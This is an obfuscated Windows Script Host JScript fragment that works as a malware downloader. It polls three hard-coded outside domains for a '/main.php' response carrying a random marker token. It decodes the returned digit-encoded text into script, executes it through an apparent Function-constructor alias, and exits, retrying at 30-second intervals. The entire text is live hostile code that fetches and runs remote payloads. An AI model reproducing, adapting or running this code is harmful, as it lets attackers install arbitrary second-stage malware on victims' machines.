Fn15 = ["kakuyasu-golf.com", "finplats.co.jp", "safetycenternederland.weppster.be"];
Dh92 = 0;
while (Dh92 < 3) {
    FB2 = WScript.CreateObject('MSXML2.ServerXMLHTTP');
    DR45 = Math.random().toString()["substr"](2, 70 + 30);
    try {
        FB2.open('GET', 'http://' + Fn15[Dh92] + '/main.php' + "?jitplyyfdujvpu=" + DR45, false);
        FB2.send();
    } catch (e) {
        return false;
    }
    if (FB2.status === 200) {
        var eH76 = FB2.responseText;
        if ((eH76.indexOf("@" + DR45 + "@", 0)) == -1) {
            WScript.sleep(30000);
        } else {
            eH76 = eH76.replace("@" + DR45 + "@", "");
            var MJ38 = eH76.replace(/(\d{2})/g, function(im26) {
                return String.fromCharCode(parseInt(im26, 10) + 30);
            });
            Kq63[3](MJ38)();
            WScript.Quit();
        }
    } else {
        WScript.sleep(30000);
    }
    Dh92++;
}
